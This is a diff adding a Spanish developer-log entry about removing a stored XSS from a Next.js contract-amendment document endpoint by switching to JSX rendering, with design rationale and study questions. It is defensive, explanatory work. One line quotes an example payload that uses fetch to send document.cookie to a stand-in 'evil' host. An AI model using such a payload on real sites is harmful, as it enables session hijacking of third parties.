@@ -4,6 +4,84 @@ Registro de sesiones de trabajo. Más nueva arriba.
 
 ---
 
+## 2026-05-07 — SEC-5 (eliminar Stored XSS en documento de modificación de contrato)
+
+### Qué hice
+
+El endpoint `POST /api/contracts/[id]/amendments/[aid]/document` construía HTML interpolando `description`, `fieldsChanged.before/.after`, nombres de partes, etc. en template literals **sin escapar**, lo guardaba en `contract_amendment.documentContent` (text), y el `GET` lo servía con `Content-Type: text/html` desde el mismo origen. Un `agent` malicioso podía meter `<script>fetch('https://evil/?c='+document.cookie)</script>` en cualquier campo y robar la sesión de quien abriera el instrumento.
+
+**Refactor (no fix mínimo)** — eliminé el vector entero en lugar de escapar interpolaciones:
+
+1. **Nuevo componente JSX**: `src/components/contracts/amendment-document.tsx` — componente server-friendly que renderea el documento desde props. Todas las strings user-supplied pasan por JSX text nodes (`{description}`, `{ownerName}`, etc.), que React auto-escapa. Cero `dangerouslySetInnerHTML`.
+
+2. **Nueva page route**: `src/app/(dashboard)/contratos/[id]/modificaciones/[aid]/page.tsx` — server component, fetchea contract + amendment + owner + tenant + agency directo desde DB (scoped por agencyId), computa `typeSeqNumber`, renderea `<AmendmentDocument {...props} />`. Si el helper `requireAgencyId` tira o el recurso no existe / es de otra agency, llama `notFound()` (404 indistinguible).
+
+3. **POST simplificado**: dejó de generar HTML. Ahora solo valida + transiciona `status = "document_generated"`. La columna `documentContent` ya no se escribe.
+
+4. **GET redirige** (307) al nuevo path, así bookmarks viejos siguen funcionando.
+
+5. **UI actualizada**: el botón "Ver documento" en `contract-tab-amendments.tsx` apunta al nuevo page route.
+
+6. **`hasDocument` flag** ahora se deriva de `status !== "registered"` (era `!!documentContent`). Sin esto, el botón "Ver documento" no aparecía para amendments nuevos post-SEC-5.
+
+7. **Schema**: `documentContent` queda nullable, marcado como `// DEPRECATED post-SEC-5` en el comment. Datos legacy quedan en la columna pero nunca más se sirven.
+
+### Por qué lo hice así y no de otra forma
+
+**Por qué refactor a JSX y no `escapeHtml()`**:
+- `escapeHtml()` te obliga a recordar envolver TODA interpolación nueva. Cualquier desarrollador que mañana agregue un nuevo campo al `buildBody` y olvide el wrap, reintroduce el XSS. Anti-fragility cero.
+- React auto-escapa por diseño. Es imposible olvidar — no existe la operación de "interpolar sin escapar" en JSX salvo que uses explícitamente `dangerouslySetInnerHTML` (cuyo nombre es la advertencia).
+- Bonus que el usuario paga por una sola vez: los documentos siempre reflejan el estado actual del contrato. Antes, si cambiabas el nombre del propietario después de generar el documento, el HTML guardado quedaba con el nombre viejo.
+
+**Por qué server component y no client**: el render server-side significa que React procesa los datos y emite HTML ya escapado. El browser recibe HTML estático seguro. No hay path de inyección client-side. Un client component que use React también auto-escapa, pero suma una API call innecesaria — el servidor ya tiene los datos.
+
+**Por qué no borrar `documentContent` ya**: borrar la columna requiere migración destructiva. Las amendments legacy tienen ahí su HTML viejo (potencialmente con XSS). Mejor: dejarlas en la columna pero NUNCA servirlas más. El GET redirige al page route que renderea desde datos, ignorando `documentContent`. Los datos legacy quedan en el suelo, sin acceso. Cuando se confirme que nadie depende del campo (futura limpieza), se puede dropear con `ALTER TABLE`.
+
+**Por qué cambiar `hasDocument` de `!!documentContent` a `status !== "registered"`**: post-SEC-5, `documentContent` es null para todos los amendments nuevos. Si `hasDocument` siguiera derivándose del campo deprecado, el botón "Ver documento" jamás aparecería para los amendments nuevos — UX rota. La fuente de verdad correcta post-refactor es el `status` (que es lo que el POST ahora transiciona). El campo `documentContent` queda como backwater de datos legacy, no como flag de control.
+
+**Por qué el redirect 307 en GET y no 404 directo**: 307 preserva el método HTTP (importante para futuro proofing) y le da al browser la oportunidad de redirigir bookmarks viejos al nuevo path sin que el user note nada. Si en algún momento se confirma que nadie usa la URL `/api/...document`, se puede dropear el GET y dar 404 limpio.
+
+### Conceptos que aparecieron
+
+- **Stored XSS vs Reflected XSS**: SEC-5 era stored — la malicious payload queda en la DB, ejecuta cuando otro user la lee. Reflected es la que reflejas en una respuesta a una request del propio atacante. Stored es worse porque afecta a TERCEROS, no solo al que envió. La defensa es la misma (escapar / no almacenar HTML), pero el impact y la urgencia difieren.
+
+- **Auto-escape como propiedad del framework**: el valor de React aquí no es performance ni hooks — es que `{value}` siempre escapa. La sintaxis no permite "interpolar como HTML" salvo que tipees explícitamente `dangerouslySetInnerHTML`. Comparado con string templates en JS donde `${x}` no escapa, React mueve la responsabilidad de seguridad del developer al framework.
+
+- **`render on-demand` vs `store rendered`**: dos patrones para "mostrar contenido derivado". Almacenado es más rápido al servir (un SELECT) pero introduce stale data + el riesgo de que el contenido refleje un mundo viejo. On-demand es más cómputo por request pero garantiza freshness y, en este caso, elimina el ataque vector. El tradeoff es performance vs correctness — para documentos legales firmados, correctness gana.
+
+- **`notFound()` de `next/navigation`**: equivalente al 404 helper de Express. Tira una excepción especial que Next.js cazza y convierte en 404. Útil para "no quiero discriminar entre 401/403/404" — todo lo que el atacante necesita saber es "esto no existe para vos".
+
+- **`renderToString` y por qué NO lo usé**: `react-dom/server.renderToString` permite renderear React a HTML string desde un endpoint API. Lo descarté porque sumaría una dependencia a un endpoint API y mantendría el "store HTML" pattern. La page route en `(dashboard)/...` ya hace render-to-HTML server-side de forma idiomática para Next.js — no hay que reinventar.
+
+- **Defense-in-depth in security architecture**: SEC-3 cierra inquilino isolation, SEC-4 cierra role isolation dentro del inquilino, SEC-5 cierra injection-via-stored-content. Cada uno cubre un eje distinto del threat model. El attacker tiene que pasar las 3 para hacer daño real.
+
+### Preguntas para reflexionar
+
+1. La regla "no almacenar HTML, rendear on-demand" es una de esas reglas que hubiera evitado el bug si se aplicaba desde el principio. ¿Por qué los developers eligen "almacenar HTML" en primer lugar? ¿Es por performance percibida, por costumbre de DOMContentLoaded fast paths, o por no querer pensar en el render context? Si entendiéramos el por qué, ¿cómo lo prevenimos en code review?
+
+2. El `documentContent` legacy queda en la DB. Si mañana un atacante encuentra una vía indirecta para servir ese contenido (por ejemplo, una nueva feature que lee la columna sin pensar), el XSS vuelve. ¿Vale la pena hacer ya un `UPDATE contract_amendment SET documentContent = NULL` para neutralizar las amendments legacy? Cuál es el costo de retención vs el costo del riesgo?
+
+3. La fix toca 5 archivos pero la lógica del documento está distribuida entre el componente, la page, y el endpoint POST. ¿Cómo se decide la "unidad de cambio mínima" en un refactor de seguridad? Si vendría a auditar en 6 meses, ¿qué archivos son obvios y cuáles requieren leer el LOG para entender por qué están así?
+
+4. La regla "JSX text nodes son seguros" tiene una sola excepción: `dangerouslySetInnerHTML`. Pero hay otras formas de inyectar HTML en React — por ejemplo, `<a href={userValue}>` con un `javascript:` URL. ¿Qué otras "trampas" sutiles hay en React que podrían reintroducir XSS por descuido?
+
+5. El GET endpoint quedó como redirect — un código de transición. ¿Cuándo conviene "remove and break" vs "redirect and migrate"? La redirección le da tiempo a los callers a moverse pero perpetúa el endpoint deprecado. ¿Hay alguna heurística clara?
+
+### Qué debería anotar en Obsidian
+
+- [ ] Concepto: Stored XSS vs Reflected XSS — qué los diferencia y por qué stored es peor
+- [ ] Concepto: Auto-escape como propiedad del framework (React vs string templates)
+- [ ] Concepto: Render on-demand vs store rendered — tradeoff de freshness vs performance
+- [ ] Patrón: refactor de XSS — preferir eliminar el vector vs escapar interpolaciones
+- [ ] Patrón: server components para documentos printable (XSS-immune por diseño)
+- [ ] Patrón: deprecation de columna sin migración destructiva (deja datos, marca con comment, deja de leer)
+- [ ] Decisión técnica: SEC-5 — JSX render-on-demand vs escapeHtml + CSP
+- [ ] Decisión técnica: 307 redirect en endpoint deprecado vs 404 directo
+- [ ] Bug: `hasDocument` derivado de `documentContent` rompió post-refactor (UX regression)
+- [ ] Comando: `notFound()` de `next/navigation` para 404 indistinguible
+
+---
+
 ## 2026-05-07 — SEC-4 (chequeo de rol en mutaciones)
 
 ### Qué hice
